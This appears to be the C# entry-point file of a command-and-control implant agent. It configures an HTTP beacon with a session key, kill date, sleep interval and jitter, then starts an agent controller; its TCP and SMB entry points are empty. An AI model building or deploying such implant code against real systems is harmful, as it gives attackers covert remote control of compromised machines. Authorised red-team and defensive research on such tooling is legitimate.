﻿using Agent.Comms;
using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Modules;
using System;

namespace Agent
{
    public class Stage
    {
        static string ID;
        static string ParentID;
        static byte[] SessionKey;

        public static void HTTPEntry(string AgentID, byte[] EncKey, DateTime KillDate, string ConnectAddress, int ConnectPort, int SleepInterval, int SleepJitter)
        {
            ID = AgentID;
            SessionKey = EncKey;

            var config = new ConfigController();
            config.Set(AgentConfig.KillDate, KillDate);
            config.Set(AgentConfig.SleepInterval, SleepInterval);
            config.Set(AgentConfig.SleepJitter, SleepJitter);

            var commModule = new HTTPCommModule(ID, ConnectAddress, ConnectPort);

            Execute(config, commModule);
        }

        public static void TCPEntry(string AgentID, string ParentAgentID, DateTime KillDate, string BindAddress, int BindPort)
        {

        }

        public static void SMBEntry(string AgentID, string ParentAgentID, DateTime KillDate, string PipeName)
        {

        }

        static void Execute(ConfigController Config, ICommModule CommModule)
        {
            var agent = new AgentController(ID, SessionKey, CommModule, Config);

            CommModule.Init(Config);
            CommModule.Start();

            agent.RegisterAgentModule(new CoreAgentModule());

            agent.Start();
        }
    }
}